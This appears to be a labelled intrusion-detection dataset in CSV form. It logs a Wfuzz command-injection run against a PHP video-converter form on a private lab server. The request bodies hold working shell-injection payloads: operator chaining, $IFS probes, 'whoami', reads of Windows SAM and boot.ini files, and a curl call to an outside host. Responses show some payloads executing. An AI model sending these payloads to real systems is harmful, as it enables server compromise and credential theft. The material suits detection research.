attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
cmdinj,192.168.1.34,80,,*/*,,,192.168.1.34,curl/7.82.0,GET,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:02 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61346
cmdinj,192.168.1.34,80,ytlink=&&type C:\\boot.ini&send=send,*/*,36,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:31 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61348
cmdinj,192.168.1.34,80,ytlink=&& type C:\Windows\repair\SAM&send=send,*/*,46,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:13 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61349
cmdinj,192.168.1.34,80,ytlink=%0a ping -i 30 127.0.0.1 %0a&send=send,*/*,45,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"uid=33(www-data) gid=33(www-data) groups=33(www-data)   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,333,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61350
cmdinj,192.168.1.34,80,ytlink=%22%7C%7Cecho%20HUGKZQ$((0%2B67))$(echo%20HUGKZQ)HUGKZQ\&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61351
cmdinj,192.168.1.34,80,ytlink=`ping 127.0.0.1`&send=send,*/*,33,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:24 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61352
cmdinj,192.168.1.34,80,ytlink=\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n&send=send,*/*,98,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:18 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61353
cmdinj,52.85.49.22,80,,*/*,,,crowdshield.com,curl/7.81.0,GET,http://crowdshield.com/.testing/rce.txt,<html> <head><title>301 Moved Permanently</title></head> <body> <center><h1>301 Moved Permanently</h1></center> <hr><center>CloudFront</center> </body> </html> ,keep-alive,167,text/html,"Sat, 04 Feb 2023 15:56:12 GMT",301,CloudFront,192.168.1.34,42698
cmdinj,192.168.1.34,80,ytlink=%20echo%20FPVLKT$((63%2B87))$(echo%20FPVLKT)FPVLKT%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:35 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61359
cmdinj,192.168.1.34,80,ytlink=%26%26echo%20FFQWQY$((35%2B58))$(echo%20FFQWQY)FFQWQY%7C&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:35 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61361
cmdinj,192.168.1.34,80,"ytlink="" && whoami&send=send",*/*,28,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:32 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61366
cmdinj,192.168.1.34,80,ytlink='&&echo%20TWKYHE$((0%2B57))$(echo%20TWKYHE)TWKYHE|&send=send,*/*,67,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:36 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61367
cmdinj,192.168.1.34,80,"ytlink=""%26%26echo%20IJQIDW$((5%2B53))$(echo%20IJQIDW)IJQIDW&send=send",*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:36 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61369
cmdinj,192.168.1.34,80,"ytlink=""%20echo%20TZKEKG$((48%2B96))$(echo%20TZKEKG)TZKEKG%7C&send=send",*/*,71,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61370
cmdinj,192.168.1.34,80,ytlink=|echo%20CAUDBF$((21%2B9))$(echo%20CAUDBF)CAUDBF\&send=send,*/*,65,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"CAUDBF30CAUDBFCAUDBF\   <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,301,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61371
cmdinj,192.168.1.34,80,ytlink=||echo%20UWJWIH$((97%2B96))$(echo%20UWJWIH)UWJWIH%7C&send=send,*/*,69,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61372
cmdinj,192.168.1.34,80,ytlink=%7C%7Cecho%20QBEEHF$((22%2B49))$(echo%20QBEEHF)QBEEHF|&send=send,*/*,71,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61373
cmdinj,192.168.1.34,80,ytlink=%26echo%20LPHFGP$((58%2B11))$(echo%20LPHFGP)LPHFGP%7C&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:38 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61374
cmdinj,192.168.1.34,80,ytlink=%27echo%20RGSQNO$((48%2B30))$(echo%20RGSQNO)RGSQNO%27&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61375
cmdinj,192.168.1.34,80,ytlink=%27%0aecho%20UDKFRM$((88%2B90))$(echo%20UDKFRM)UDKFRM%7C&send=send,*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61376
cmdinj,192.168.1.34,80,ytlink=%22||echo%20WMJGBT$((73%2B39))$(echo%20WMJGBT)WMJGBT%5C%5C&send=send,*/*,75,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:39 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61377
cmdinj,192.168.1.34,80,ytlink=%20echo%20THCQQN$((0%2B88))$(echo%20THCQQN)THCQQN%5C%5C&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:40 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61378
cmdinj,192.168.1.34,80,ytlink=&echo%20QSELIT$((42%2B46))$(echo%20QSELIT)QSELIT&&send=send,*/*,66,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:40 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61379
cmdinj,192.168.1.34,80,ytlink=%3Becho%20OKHPYH$((66%2B11))$(echo%20OKHPYH)OKHPYH%27&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61380
cmdinj,192.168.1.34,80,ytlink=%7Cecho%20VZDOKD$((12%2B24))$(echo%20VZDOKD)VZDOKD%7C&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61382
cmdinj,192.168.1.34,80,ytlink=;echo$IFSORHOEA$((71%2B59))$(echo$IFSORHOEA)ORHOEA%26&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:41 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61383
cmdinj,192.168.1.34,80,"ytlink='%20echo%20DHXKNT$((83%2B17))$(echo%20DHXKNT)DHXKNT""&send=send",*/*,69,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61384
cmdinj,192.168.1.34,80,ytlink='echo$IFSQUCSSY$((71%2B59))$(echo$IFSQUCSSY)QUCSSY%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61385
cmdinj,192.168.1.34,80,"ytlink=""echo$IFSGOPZNT$((61%2B76))$(echo$IFSGOPZNT)GOPZNT&&send=send",*/*,68,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:42 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61386
cmdinj,192.168.1.34,80,ytlink=echo$IFSSWOEAI$((89%2B70))$(echo$IFSSWOEAI)SWOEAI&send=send,*/*,66,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61387
cmdinj,192.168.1.34,80,ytlink=|echo$IFSMNCLPS$((56%2B63))$(echo$IFSMNCLPS)MNCLPS%22&send=send,*/*,70,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61388
cmdinj,192.168.1.34,80,"ytlink=%26%26echo$IFSAHYRFK$((59%2B15))$(echo$IFSAHYRFK)AHYRFK""&send=send",*/*,73,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:43 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61389
cmdinj,192.168.1.34,80,ytlink=%7Cecho$IFSGUAVSF$((73%2B82))$(echo$IFSGUAVSF)GUAVSF%27&send=send,*/*,72,application/x-www-form-urlencoded,192.168.1.34,Wfuzz/3.1.0,POST,http://192.168.1.34/app1/yt2mp3.php,"  <!DOCTYPE html> <html>  <head>   <title>simple youtube to mp3 converter</title>  </head>  <body>   <form method=""POST"">    <input type=""text"" name=""ytlink"" placeholder=""Send your link here"" required>    <input type=""submit"" name=""send"" value=""send"">   </form>  </body> </html> ",close,279,text/html; charset=UTF-8,"Sat, 04 Feb 2023 15:56:44 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.35,61390
